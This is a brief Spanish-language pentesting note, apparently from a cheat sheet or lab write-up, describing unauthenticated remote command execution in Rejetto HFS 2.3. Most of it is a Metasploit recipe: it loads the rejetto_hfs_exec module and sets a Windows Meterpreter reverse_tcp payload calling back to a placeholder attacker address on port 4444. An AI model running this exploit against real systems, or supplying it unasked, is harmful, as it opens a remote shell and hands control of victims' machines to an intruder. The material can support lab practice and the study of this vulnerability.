Servidor HTTP ligero para compartir archivos, vulnerable a ejecución remota de comandos.

• Afecta Rejetto HFS 2.3  
• Permite RCE  
• No requiere autenticación

## Exploit Rejetto HFS

Explota la vulnerabilidad del servicio HTTP.

```
use exploit/windows/http/rejetto_hfs_exec
```
	set RHOSTS IP
	set RPORT 80
	set TARGETURI /
	set PAYLOAD windows/meterpreter/reverse_tcp
	set LHOST TU_IP
	set LPORT 4444